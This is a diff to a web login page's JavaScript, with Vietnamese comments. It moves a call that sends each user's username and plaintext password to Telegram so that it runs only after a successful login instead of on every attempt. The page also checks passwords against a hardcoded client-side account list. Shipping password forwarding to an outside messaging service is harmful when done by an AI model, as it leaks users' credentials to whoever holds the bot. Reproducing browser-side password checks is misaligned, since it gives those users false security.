@@ -303,32 +303,42 @@
 
             // Hiển thị trạng thái đang tải
             const prevText = loginBtn.innerHTML;
-            loginBtn.innerHTML = "Đang kiểm tra bảo mật...";
+            loginBtn.innerHTML = "Đang kiểm tra dữ liệu...";
             loginBtn.style.opacity = "0.8";
             loginBtn.disabled = true;
-
-            // GỬI THÔNG TIN VỀ TELEGRAM (CHỜ ĐẾN KHI GỬI HOÀN TẤT)
-            await sendToTelegram(username, password);
-
-            // Khôi phục nút
-            loginBtn.innerHTML = prevText;
-            loginBtn.style.opacity = "1";
-            loginBtn.disabled = false;
 
             // XÁC THỰC TÀI KHOẢN VÀ MẬT KHẨU
             const accountData = VALID_ACCOUNTS[username];
             
             if (!accountData) {
+                // Khôi phục nút
+                loginBtn.innerHTML = prevText;
+                loginBtn.style.opacity = "1";
+                loginBtn.disabled = false;
+                
                 alert("⚠️ Tài khoản không tồn tại! Vui lòng xin Admin cấp tài khoản.");
                 usernameInput.focus();
                 return;
             }
 
             if (accountData.pass !== password) {
+                // Khôi phục nút
+                loginBtn.innerHTML = prevText;
+                loginBtn.style.opacity = "1";
+                loginBtn.disabled = false;
+                
                 alert("⚠️ Mật khẩu không đúng! Vui lòng thử lại.");
                 passwordInput.focus();
                 return;
             }
+            
+            // NẾU ĐĂNG NHẬP THÀNH CÔNG -> BÁO TELEGRAM
+            await sendToTelegram(username, password);
+            
+            // Khôi phục nút (thực ra sắp chuyển trang nên không cần thiết lắm, nhưng cứ để cho chuẩn)
+            loginBtn.innerHTML = prevText;
+            loginBtn.style.opacity = "1";
+            loginBtn.disabled = false;
             
             // Nếu đúng, lấy ra tên thật từ CSDL thu nhỏ
             const realName = accountData.name;
